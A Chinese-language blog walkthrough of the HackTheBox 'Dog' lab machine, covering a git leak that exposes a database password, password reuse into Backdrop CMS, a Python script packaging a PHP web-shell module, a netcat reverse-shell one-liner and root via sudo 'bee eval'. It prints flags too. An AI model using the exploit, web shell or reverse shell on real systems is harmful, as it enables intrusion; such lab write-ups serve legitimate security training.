---
title: HackTheBox-Season7-Dog
published: 2025-03-10 12:28:24
tags: [HackTheBox]
category: 靶机
draft: false
---

# Season7-Dog

> https://app.hackthebox.com/machines/Dog | `esay`
> 

## 前期踩点

`10.10.11.58`是靶机，进行`nmap`扫描

```bash
root@kali  ~/Desktop/test/Dog  nmap -sT -min-rate 10000 -p-  10.10.
11.58
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-09 20:55 EDT
Nmap scan report for 10.10.11.58
Host is up (0.14s latency).
Not shown: 65478 filtered tcp ports (no-response), 55 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 24.98 seconds
```

扫描出来`.git`文件夹，那么可能存在`git`泄露；`robots.txt`文件

```bash
⚡ root@kali  ~/Desktop/test/Dog  nmap -sT -A -T4 -O -p 22,80 10.10.11.58   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-09 20:56 EDT
Nmap scan report for 10.10.11.58                                              
Host is up (0.18s latency).                                                   
                                                                              
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:             
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)                                                                                               
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)                                                                                              
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)                                                                                            
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))                                                                                                          
|_http-title: Home | Dog                                                                                                                                     
| http-robots.txt: 22 disallowed entries (15 shown)      
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
| http-git:             
|   10.10.11.58:80/.git/ 
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...        
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...

Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                                        
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A 
or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)                                      
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops                                                      
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel        
                                                                              
TRACEROUTE (using proto 1/icmp)                                               
HOP RTT       ADDRESS                                                         
1   179.23 ms 10.10.16.1
2   132.86 ms 10.10.11.58
                                       
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.60 seconds        
```

访问HTTP并收集指纹

![image.png](image.png)

在主页`about`中发现域名`htb.dog`添加到hosts，并且能知道使用的是`Backdrop CMS`

![image.png](image%201.png)

## git 泄露

使用`githack`扒拉

```bash
⚡ root@kali  ~/Desktop/test/Dog  githack http://dog.htb/.git
```

![image.png](image%202.png)

`setting.php`，知道配置文件在`./files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/` ，并且能都得到一组账户?密码`root:BackDropJ2024DS2024`

```bash
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';                                                                                           

$config_directories['active'] = './files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active';  
$config_directories['staging'] = './files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/staging';  

$settings['hash_salt'] = 'aWFvPQNGZSz1DQ701dD4lC5v1hQW34NefHvyZUzlThQ';                                                                                      
```

尝试在配置文件中进行搜索，最后通过`dog.htb`可以得到一个新用户名`tiffany`

```bash
⚡ root@kali  ~/Desktop/test/Dog/site/dog.htb  grep -rE 'dog.htb' ./files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/
./files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        "tiffany@dog.htb"
```

密码碰撞后可以通过`tiffany:BackDropJ2024DS2024` 进入后台

![image.png](image%203.png)

## 后台利用

在后台能发现文件上传点

![image.png](image%204.png)

但是提示未开启ZIP拓展导致无法使用

在`?q=admin/installer/manual` 可以找到能使用的上传点

![image.png](image%205.png)

通过搜索引擎能找到利用 https://cve-diaries.com/en-technical-analysis-of-backdrop-cms-1-27-1-remote-command-execution-rce-d9e87b2c3cae

exploit.py

```bash
import os
import time
import zipfile

def create_files():
    info_content = """
type = module
name = Block
description = Controls the visual building blocks a page is constructed with. Blocks are boxes of content rendered into an area, or region, of a web page.
package = Layouts
tags[] = Blocks
tags[] = Site Architecture
version = BACKDROP_VERSION
backdrop = 1.x
configure = admin/structure/block
; Added by Backdrop CMS packaging script on 2024-03-07
project = backdrop
version = 1.27.1
timestamp = 1709862662
"""
    shell_info_path = "shell/shell.info"
    os.makedirs(os.path.dirname(shell_info_path), exist_ok=True)
    with open(shell_info_path, "w") as file:
        file.write(info_content)

    shell_content = """
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
if(isset($_GET['cmd']))
{
system($_GET['cmd']);
}
?>
</pre>
</body>
</html>
"""
    shell_php_path = "shell/shell.php"
    with open(shell_php_path, "w") as file:
        file.write(shell_content)

    return shell_info_path, shell_php_path

def create_zip(info_path, php_path):
    zip_filename = "shell.zip"
    with zipfile.ZipFile(zip_filename, 'w') as zipf:
        zipf.write(info_path, arcname='shell/shell.info')
        zipf.write(php_path, arcname='shell/shell.php')
    return zip_filename

def main(url):
    print("Backdrop CMS 1.27.1 - Remote Command Execution Exploit")
    time.sleep(3)

    print("Evil module generating...")
    time.sleep(2)

    info_path, php_path = create_files()
    zip_filename = create_zip(info_path, php_path)

    print("Evil module generated!", zip_filename)
    time.sleep(2)

    print("Go to " + url + "/admin/modules/install and upload the " + zip_filename + " for Manual Installation.")
    time.sleep(2)

    print("Your shell address:", url + "/modules/shell/shell.php")

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python script.py [url]")
    else:
        main(sys.argv[1])
```

运行后即可拿到后台文件

![image.png](image%206.png)

![image.png](image%207.png)

填入反弹shell命令，即可获得`shell`

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.4 1234 >/tmp/f
```

```bash
⚡ root@kali  ~/Desktop/test/Dog  nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.11.58] 52554
bash: cannot set terminal process group (1003): Inappropriate ioctl for device
bash: no job control in this shell
www-data@dog:/var/www/html/modules/shell$ 
```

## 提权

查看后台运行的程序

```bash
www-data@dog:/var/www/html$ ss -tupl
ss -tupl
Netid State   Recv-Q  Send-Q   Local Address:Port     Peer Address:Port Process 
udp   UNCONN  0       0              0.0.0.0:bootpc        0.0.0.0:*            
udp   UNCONN  0       0        127.0.0.53%lo:domain        0.0.0.0:*            
tcp   LISTEN  0       70           127.0.0.1:33060         0.0.0.0:*            
tcp   LISTEN  0       151          127.0.0.1:mysql         0.0.0.0:*            
tcp   LISTEN  0       4096     127.0.0.53%lo:domain        0.0.0.0:*            
tcp   LISTEN  0       128            0.0.0.0:ssh           0.0.0.0:*            
tcp   LISTEN  0       511                  *:http                *:*            
tcp   LISTEN  0       128               [::]:ssh              [::]:*  
```

之前有拿到一个数据库的账号密码，尝试进行mysql登录，但是会一直卡住

```bash
www-data@dog:/var/www/html/modules/shell$ mysql -u root -p
mysql -u root -p
Enter password: BackDropJ2024DS2024
^[OP
```

查看`/etc/passwd`

```bash
www-data@dog:/var/www/html/modules/shell$ cat /etc/passwd
cat /etc/passwd                                                               
root:x:0:0:root:/root:/bin/bash                                               
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin                             
bin:x:2:2:bin:/bin:/usr/sbin/nologin                                          
sys:x:3:3:sys:/dev:/usr/sbin/nologin                                          
sync:x:4:65534:sync:/bin:/bin/sync                                            
games:x:5:60:games:/usr/games:/usr/sbin/nologin 
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin   
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin           
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin          
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
roxy:x:13:13:proxy:/bin:/usr/sbin/nologin                                    
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin                          
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin                                                                                                             
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin                                                                            
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin                                                                       
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin  
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin                                                                    
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin                              
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin          
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false                                                                                                  
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin                                 
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin        
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin                     
pollinate:x:110:1::/var/cache/pollinate:/bin/false                            
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin            
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin                                 
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin            
jobert:x:1000:1000:jobert:/home/jobert:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
johncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash
_laurel:x:997:997::/var/log/laurel:/bin/false    
```

我们要当前目标用户是`jobert`和`johncusack` ，权限问题无法查看其家目录内容

再尝试密码碰撞，使用`BackDropJ2024DS2024` ，使用用户`johncusack` 成功碰撞…

```bash
⚡ root@kali  ~/Desktop/test/Dog  ssh johncusack@dog.htb
The authenticity of host 'dog.htb (10.10.11.58)' can't be established.
ED25519 key fingerprint is SHA256:M3A+wMdtWP0tBPvp9OcRf6sPPmPmjfgNphodr912r1o. 
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'dog.htb' (ED25519) to the list of known hosts.
johncusack@dog.htb's password:                                                
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)                                                                                           
                                                                              
 * Documentation:  https://help.ubuntu.com                                                                                                                   
 * Management:     https://landscape.canonical.com  
 * Support:        https://ubuntu.com/pro       
                                                                              
 System information as of Tue 04 Mar 2025 03:55:57 PM UTC  
                                                                              
  System load:           0.63                                                 
  Usage of /:            55.6% of 6.32GB                 
  Memory usage:          16%                                                  
  Swap usage:            0%                                                   
  Processes:             258                                                  
  Users logged in:       0                                                    
  IPv4 address for eth0: 10.10.11.58                                          
  IPv6 address for eth0: dead:beef::250:56ff:feb9:b2de
                                                                              
                                                                              
Expanded Security Maintenance for Applications is not enabled.
                                                                              
0 updates can be applied immediately.                                         
                                                                              
Enable ESM Apps to receive additional future security updates.        
See https://ubuntu.com/esm or run: sudo pro status                                                                                                           
                                                                              
                                                                              
johncusack@dog:~$                                                         
```

查看权限，可以以root权限运行`bee`

```bash
johncusack@dog:~$ sudo -l
[sudo] password for johncusack: 
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

```bash
johncusack@dog:~$ sudo bee             
🐝 Bee                                 
Usage: bee [global-options] <command> [options] [arguments]                                                                                                  
                                                                                                                                                             
Global Options:                                                               
 --root                                                                       
 Specify the root directory of the Backdrop installation to use. If not set, will try to find the Backdrop installation automatically based on the current di
rectory.                                                                      
                                                                              
 --site                
 Specify the directory name or URL of the Backdrop site to use (as defined in 'sites.php'). If not set, will try to find the Backdrop site automatically base
d on the current directory.                                                   
                                                                              
 --base-url                
 Specify the base URL of the Backdrop site, such as https://example.com. May be useful with commands that output URLs to pages on the site.
                                                                              
 --yes, -y                                                                    
 Answer 'yes' to questions without prompting.    
 --debug, -d                                                                  
 Enables 'debug' mode, in which 'debug' and 'log' type messages will be displayed (in addition to all other messages).                                       
                                       
                                                                              
Commands:                                                                     
 CONFIGURATION                                                                                                                                               
  config-export                                                                                                                                              
   cex, bcex                                                                  
   Export config from the site.        
                                       
  config-get                           
   cget                                                                                                                                                      
   Get the value of a specific config option, or view all the config options in a given file.                                                                
                                                                              
  config-import                                                               
   cim, bcim                                                                                                                                                 
   Import config into the site.                                               
                                                                              
  config-set           
   cset                                                                                                                                                      
   Set the value of an option in a config file.                               
                                                                              
 CORE                      
  download-core                                                                                                                                              
   dl-core                                                                    
   Download Backdrop core.                                                    
 install                                                                     
   si, site-install                                                           
   Install Backdrop and setup a new site.                                                                                                                    
                                       
 DATABASE                                                                     
  db-drop                                                                     
   sql-drop                                                                                                                                                  
   Drop the current database and recreate an empty database with the same details. This could be used prior to import if the target database has more tables 
than the source database.                                                     
                                       
  db-export                            
   dbex, db-dump, sql-export, sql-dump 
   Export the database as a compressed SQL file. This uses the --no-tablespaces option by default.                                                           
                                                                                                                                                             
  db-import                                                                   
   dbim, sql-import                                                           
   Import an SQL file into the current database.                                                                                                             
                                                                              
 INFORMATION                                                                  
  help                 
   Provide help and examples for 'bee' and its commands.                                                                                                     
                                                                              
  log                                                                         
   ws, dblog, watchdog-show
   Show database log messages.                                                                                                                               
                                                                              
  status                                                                      
   st, info, core-status                                                      
   Provides an overview of the current Backdrop installation/site.           
                                                                               
  version                                                                                                                                                    
   Display the current version of Bee. 
                                                                              
 MISCELLANEOUS                                                                
  cache-clear                                                                                                                                                
   cc                                                                                                                                                        
   Clear a specific cache, or all Backdrop caches.                            
                                       
  cron                                 
   Run cron.                           
                                                                                                                                                             
  maintenance-mode                                                                                                                                           
   mm                                                                         
   Enable or disable maintenance mode for Backdrop.                           
                                                                                                                                                             
 PROJECTS                                                                     
  disable                                                                     
   dis, pm-disable     
   Disable one or more projects (modules, themes, layouts).                                                                                                  
                                                                              
  download                                                                    
   dl, pm-download         
   Download Backdrop contrib projects.                                                                                                                       
                                                                              
  enable                                                                      
   en, pm-enable                                                              
   Enable one or more projects (modules, themes, layouts).       
	projects                                                                                                                                                   
   pml, pmi, project, pm-list, pm-info 
   Display information about available projects (modules, themes, layouts).   
                                                                              
  uninstall                                                                                                                                                  
   pmu, pm-uninstall                                                                                                                                         
   Uninstall one or more modules.                                             
                                       
 ROLES                                 
  permissions                          
   pls, permissions-list                                                                                                                                     
   List all permissons of the modules.                                                                                                                       
                                                                              
  role-add-perm                                                               
   rap                                                                                                                                                       
   Grant specified permission(s) to a role.                                   
                                                                              
  role-create          
   rcrt                                                                                                                                                      
   Add a role.                                                                
                                                                              
  role-delete              
   rdel                                                                                                                                                      
   Delete a role.                                                             
                                                                              
  role-remove-perm                                                            
   rrp          
 USERS                                                                                                                                                       
  user-add-role                        
   urole, urol                                                                
   Add role to user.                                                          
                                                                                                                                                             
  user-block                                                                                                                                                 
   ublk                                                                       
   Block a user.                       
                                       
  user-cancel                          
   ucan                                                                                                                                                      
   Cancel/remove a user.                                                                                                                                     
                                                                              
  user-create                                                                 
   ucrt                                                                                                                                                      
   Create a user account with the specified name.                             
                                                                              
  user-login           
   uli                                                                                                                                                       
   Display a login link for a given user.                                     
                                                                              
  user-password            
   upw, upwd                                                                                                                                                 
   Reset the login password for a given user.                                 
                                                                              
  user-remove-role                                                            
   urrole, urrol 
                                                                                                                                                              
  user-unblock                         
   uublk                                                                      
   Unblock a user.                                                            
                                                                                                                                                             
  users                                                                                                                                                      
   uls, user-list                                                             
   List all user accounts.             
                                       
 ADVANCED                              
  db-query                                                                                                                                                   
   dbq                                                                                                                                                       
   Execute a query using db_query().                                          
                                                                              
  eval                                                                                                                                                       
   ev, php-eval                                                               
   Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop.    
                                       
  php-script                                                                                                                                                 
   scr                                                                        
   Execute an arbitrary PHP file after bootstrapping Backdrop.                
                                       
  sql                                                                                                                                                        
   sqlc, sql-cli, db-cli                                                      
   Open an SQL command-line interface using Backdrop's database credentials.  
```

对参数进行测试，通过以下命令成功以`root`身份命令执行

```bash
johncusack@dog:~$ sudo bee --root=/var/www/html eval "system(id)"

 ⚠  Warning: Use of undefined constant id - assumed 'id' (this will throw an Error in a future version of PHP)
in eval() (line 1 of /backdrop_tool/bee/commands/php.bee.inc(51) : eval()'d code).

uid=0(root) gid=0(root) groups=0(root)
```

获得`root shell`

```bash
johncusack@dog:~$ sudo bee --root=/var/www/html eval "system('/bin/bash')"
root@dog:/var/www/html# 
```

## Flag

```bash
root@dog:/var/www/html# cat /home/johncusack/user.txt 
fb94f5fef9c1ed963af3eeccffb86867
root@dog:/var/www/html# cat /root/root.txt 
4b4e17fb473d44908a538e2f99b27e8d
```

## 总结

git泄露，后台文件上传利用，上传点不好找，还有就是密码碰撞，下次将密码碰撞优先级提高一些